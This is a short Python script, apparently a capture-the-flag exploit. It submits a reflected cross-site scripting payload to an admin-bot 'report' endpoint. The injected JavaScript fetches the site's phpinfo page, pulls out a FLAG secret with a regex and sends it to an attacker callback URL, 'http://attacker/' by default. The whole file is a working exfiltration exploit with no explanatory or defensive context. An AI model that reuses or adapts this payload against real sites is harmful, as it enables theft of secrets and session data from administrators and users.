import requests
import urllib.parse
import os

BOT = os.environ.get("BOT", "http://localhost:1337/").rstrip("/")
CONNECTBACK_URL = os.environ.get("CONNECTBACK_URL", "http://attacker/").rstrip("/")

js = """
fetch("/?func=phpinfo")
    .then(v=>v.text())
    .then(v=>location='""" + CONNECTBACK_URL + """/?'+v.match(/FLAG=([^<\\s]+)/g)[1])
"""
js = urllib.parse.quote(js, safe="")

s = requests.session()

r = s.post(f"{BOT}/api/report", json={
    "path": f"""?func=echoString&string=<script>{js}</script>"""
})

print(r.text)